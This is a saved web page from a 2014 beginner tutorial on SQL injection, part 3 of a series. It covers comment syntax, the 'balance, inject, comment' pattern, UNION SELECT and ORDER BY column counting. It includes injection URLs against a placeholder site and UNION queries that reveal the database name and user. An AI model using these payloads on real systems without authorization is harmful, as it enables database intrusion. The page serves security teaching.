 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="In this part we will learn how to find out the type of comment to be used and how and why to find out the number of columns">
<title>Basic of SQL for SQL Injection part 3</title>
<link rel="stylesheet" href="../../css/skel.css" />
<link rel="stylesheet" href="../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../js/jquery.min.js"></script>
<script src="../../js/jquery.dropotron.min.js"></script>
<script src="../../js/skel.min.js"></script>
<script src="../../js/skel-layers.min.js"></script>
<script src="../../js/init.js"></script>
<script src="../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="Part-3-Basic-of-SQL-for-SQLi.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../index.html">Home</a></li>
<li>
<a href="Part-3-Basic-of-SQL-for-SQLi.html">Categories</a>
<ul>
<li><a href="../Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="index.html">SQL Injection</a>
<ul>
<li><a href="MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../Tricks/index.html">Tricks</a></li>
<li><a href="../XSS/index.html">XSS</a></li>
<li><a href="../LFI/index.html">LFI</a></li>
<li><a href="../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../construction.html">The Idiots Team</a></li>
<li><a href="../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">Basic of SQL for SQL Injection part 3</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;">Welcome to the third part of basics of SQL for SQL injection. As in the last part we took this url &quot;<font color='#10F742'>http://fakesite.com/report.php?id=23</font>&quot; as an example and then assumed some basic queries by looking at the URL and then we tried different injections and learnt how to figure out which type of query we are facing. In this tutorial we will learn how we can understand which comment type we should use and why and how to find the number of columns<br></br>
As discussed earlier following are the different types of comments used in SQLi.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>Comment</th><th></th><th>Name</th></tr>
<tr><td>--</td><td>:</td><td>MySQL Linux Style</td></tr>
<tr><td>--+</td><td>:</td><td>MySQL Windows Style</td></tr>
<tr><td>#</td><td>:</td><td>Hash (URL encode while use)</td></tr>
<tr><td>--+-</td><td>:</td><td>SQL Comment</td></tr>
<tr><td>;%00</td><td>:</td><td>Null Byte</td></tr>
<tr><td>`</td><td>:</td><td>Backtick</td></tr>
</table><br><br>
well actually it only depends on the environment and reaction of application when we try some commenting operators.
If you see php is used then usually &quot;--&quot; will surely work other wise you can check &quot;--+&quot; or &quot;# (url encoded)&quot;, else the best option is to try with different types of comments and analyse the input.
So what we will do to check is try to close our input with all possibilities like single quote double quote or brackets etc, and comment rest query and if it works then we can be sure that this comment is working.
We will again take the same url for example &quot;<font color='#10F742'>http://fakesite.com/report.php?id=23</font>&quot; so lets see how can we check for which comment to use.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>Injection</th><th></th><th>If it gives same Output as 23 was giving then</th></tr>
<tr><td>http://fakesite.com/report.php?id=23--</td><td>:</td><td>Its intiger type injection and '--' can be used as comment</td></tr>
<tr><td>http://fakesite.com/report.php?id=23'--</td><td>:</td><td>Its Single quote type injection and '--' can be used as comment</td></tr>
<tr><td>http://fakesite.com/report.php?id=23&quot;--</td><td>:</td><td>Its Double quote type injection and '--' can be used as comment</td></tr>
<tr><td>http://fakesite.com/report.php?id=23)--</td><td>:</td><td>Its intiger type with bracket injection and '--' can be used as comment</td></tr>
<tr><td>http://fakesite.com/report.php?id=23')--</td><td>:</td><td>Its Single quote with bracket type injection and '--' can be used as comment</td></tr>
<tr><td>http://fakesite.com/report.php?id=23&quot;)--</td><td>:</td><td>Its Double quote with bracket type injection and '--' can be used as comment</td></tr>
</table><br><br>
so as i showed above test for '--' type comment in the same manner you can check for all commenting types and the one which gives same output as giving with &quot;<font color='#10F742'>http://fakesite.com/report.php?id=23</font>&quot; then that can help you understand the type of internal query alongwith the comment that you can use.<br><br>
Now as we have understood understanding and knowing the internal query and then finding the type of command we can use. First of all we will understand the basics of injecting.<br><br>
Any time anywhere or any application where ever and whenever you are injecting there are following three basic rules of injecting<br><br>
[1]. Balance.<br>
[2]. Inject.<br>
[3]. Commenting.<br><br>
<u>Understanding the first phase &quot;<b>Balance</b>&quot;</u>:<br><br>
In this phase we balance the internal query, for example lets say after reading the <a href='Part-1-Basic-of-SQL-for-SQLi.html'>Part 1</a> and <a href='Part-2-Basic-of-SQL-for-SQLi.html'>Part 2</a> we understand that how can we assume and figure out the internal query used by the application where your input is injected. Lets say we figured out that out internal query is &quot;<font color='#10F742'>Select * from tablename where id=('23')</font>&quot; so in this case our balance input should be 23').<br><br>
<u>The phase of <b>Injection</b></u>:<br><br>
In this phase we inject as per our requirement, and the type of injection we are doing.<br><br>
<u>The phase of <b>Commenting</b></u>:<br><br>
Then the last part of commenting, which we already know. Now check the below image which will show you all the three parts on injection.<br>
<img src='../../post_images/1_sqli_basic3.png'></img><br><br>
As per the Above Injection we can assume the internal query to be:
<pre>Select * from tablename where id='&lt;input&gt;'<br>So when we pass the url &quot;<font color='#10F742'>http://fakesite.com/report.php?id=23' order by 1--+</font>&quot; then it will be injected on place of &lt;input&gt; in above query and become:<br>Select * from tablename where id='<font color='#10F742'>23' order by 1--+</font>'</pre><br><br>
So now lets start with our next phase, in this phase we will learn why and how to find the number of columns. First lets start by understanding why we require to find the number of columns.
First again lets start from the basics our example database:
<br><img src="../../post_images/database_tables.png"></img><br><br>
<pre>Select f_name,l_name from students where id=1</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
</table><br><br>
Now lets see how we can manipulate the output using Union statement. Union is used to add the output of multiple queries together. For Example Below is a simple union query.<br><br>
<pre>Select f_name,l_name from students where id=1 union select f_name,l_name from students where id=2</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
<tr><td>Deniel</td><td>Robertson</td></tr>
</table><br><br>
So what the union query did over here is it concatenated output of two different Select queries. But one thing to remember while concatenating, that Union will only concatenate if both queries are outputting same numbers of columns. Lets try some more.
<pre>Select f_name,l_name from students where id=1 union select 1,2</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
<tr><td>1</td><td>2</td></tr>
</table><br><br>
<pre>Select f_name,l_name from students where id=1 union select 'hello','bye'</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
<tr><td>hello</td><td>bye</td></tr>
</table><br><br>
<pre>Select f_name,l_name from students where id=1 union select 5545,2323</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
<tr><td>5545</td><td>2323</td></tr>
</table><br><br>
<pre>Select f_name,l_name from students where id=1 union select database(),user()</pre><br><br>
Output will be:<br><br>
<table cellspacing="0" class='table10'>
<tr><th>f_name</th><th>l_name</th></tr>
<tr><td>Emily</td><td>watson</td></tr>
<tr><td>fakedb1</td><td><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="afc9cec4cadadccaddefc3c0cccec3c7c0dcdb">[email&#160;protected]</a></td></tr>
</table><br><br>
<pre>Select * from students where id=1 union select f_name,l_name from students where id=2</pre><br><br>
for the above one there wont be any output but only an error that &quot;<font color='#FC2A2A'>The used SELECT statements have a different number of columns</font>&quot;, because &quot;select * from students&quot; is selecting all the columns from the table students which are four, that is why when we tried to union 2 columns with it, we got an error. Union select is used to concatenate our injected output with the real output. Here we face a problem that we must know the number of columns select query is using so that we can make the right union select statement. Here enters the &quot;order by&quot; keyword. Order by is used to sort the output of a query lets see some examples.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>Query</th><th></th><th>Output</th></tr>
<tr><td>select * from students order by 1</td><td>:</td><td>It will output all the rows and sort then by the first column which is id</td></tr>
<tr><td>select * from students order by 2</td><td>:</td><td>It will output all the rows and sort then by the second column which is f_name</td></tr>
<tr><td>select * from students order by 3</td><td>:</td><td>It will output all the rows and sort then by the third column which is l_name</td></tr>
<tr><td>select * from students order by 4</td><td>:</td><td>It will output all the rows and sort then by the forth column which is roll_no</td></tr>
<tr><td>select * from students order by 5</td><td>:</td><td>It will create an error &quot;<font color='#FC2A2A'>Unknown column '5' in 'order clause'</font>&quot;</td></tr>
<tr><td>select f_name,l_name from students order by 1</td><td>:</td><td>It will output all the rows and sort then by the first column which is f_name</td></tr>
<tr><td>select f_name,l_name from students order by 2</td><td>:</td><td>It will output all the rows and sort then by the second column which is l_name</td></tr>
<tr><td>select f_name,l_name from students order by 3</td><td>:</td><td>It will create an error &quot;<font color='#FC2A2A'>Unknown column '3' in 'order clause'</font>&quot;</td></tr>
</table><br><br>
So we have analysed above that if we try to sort our output with any number which is more than our column count then it will create error. So we can easily understand that we can use order by to know how many columns we have inside the query.<br><br>
Now again lets take an example URL &quot;<font color='#10F742'>http://fakesite.com/report.php?id=23</font>&quot; and start injecting it from starting:<br><br>
<font size='3'>[#] <u><b>Testing</b></u></font><br><br>
<table cellspacing="0" class='table10'>
<tr><th>Query</th><th></th><th>Output</th></tr>
<tr><td>http://fakesite.com/report.php?id=23</td><td>:</td><td>Simple Output from Web-Application</td></tr>
<tr><td>http://fakesite.com/report.php?id=23'</td><td>:</td><td>Error &quot;<font color='#FC2A2A'>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1</font>&quot;</td></tr>
<tr><td>http://fakesite.com/report.php?id=23"</td><td>:</td><td>Error &quot;<font color='#FC2A2A'>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;' at line 1</font>&quot;</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 and true</td><td>:</td><td>As we remember in <a href='Part-2-Basic-of-SQL-for-SQLi.html'>Part 2</a> while testing internal query if error comes with both single and double qoute then the internal query could be intiger based, so now testing for that. It Gives output</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 and false</td><td>:</td><td>No Output</td></tr>
</table><br><br>
So as we learnt from <a href='Part-2-Basic-of-SQL-for-SQLi.html'>Part 2</a> we tested this URL and understood that its a Intiger Based Query. We can make an assumption like below.
<pre>Select * from anytablename where id=&lt;Input&gt;</pre><br><br>
Now let us try and see which comment type we can use. As we already know that input is intiger type and is not enclosed by any single or double qoute so we will be testing for intiger type injection only and wont have to close any single or double qoute this time.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>Query</th><th></th><th>Output</th></tr>
<tr><td>http://fakesite.com/report.php?id=23`</td><td>:</td><td>Backtick type commenting (Error)</td></tr>
<tr><td>http://fakesite.com/report.php?id=23--</td><td>:</td><td>Error or no Output</td></tr>
<tr><td>http://fakesite.com/report.php?id=23--+</td><td>:</td><td>Same Output like 23 was giving</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 or true--+</td><td>:</td><td>No error but some different output</td></tr>
</table><br><br>
As we learnt while testing for comment type we can understand with the above output that --+ can be used over here as comment. So as we can see whatever we inject in URL gets injected in the query. Our next task starts here. As now we need to use Union Select statement so that we can manipulate the output and print whatever we want to extract about and from the database. But to use Union select we must know the number of columns used under the query. For that we will use 'Order By' as we know if we give order by a number more than the number under the query, then it will throw an error.<br><br>
<table cellspacing="0" class='table10'>
<tr><th>URL Injection</th><th>Internal Query</th><th>Output</th></tr>
<tr><td>http://fakesite.com/report.php?id=23 order by 10--+</td><td>Select * from tablename where id=23 order by 10</td><td>Error (then reduce)</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 order by 1--+</td><td>Select * from tablename where id=23 order by 1</td><td>Working (then increse)</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 order by 5--+</td><td>Select * from tablename where id=23 order by 5</td><td>Working (then increase)</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 order by 8--+</td><td>Select * from tablename where id=23 order by 8</td><td>Error (then reduce)</td></tr>
<tr><td>http://fakesite.com/report.php?id=23 order by 6--+</td><td>Select * from tablename where id=23 order by 6</td><td>Error (then reduce)</td></tr>
</table><br><br>
We already know that 5 worked so we dont need to reduce and test again. We can simply understand that 5 is the last number that worked. Now we can use Union select query, which will be the next phase of our injection.
Thats all for this part. We will continue our Journey to SQLi in next part.<br><img src="../../post_images/SQli.jpg" width=0>
<br>Author : Zenodermus Javanicus<br>Date : 2014-03-10</span><br><br></div><div id="disqus_thread"></div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html";  
this.page.identifier = "18";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="Part-3-Basic-of-SQL-for-SQLi.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="4d2c292024230d3e282e383f24393424292422393e632e2220">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
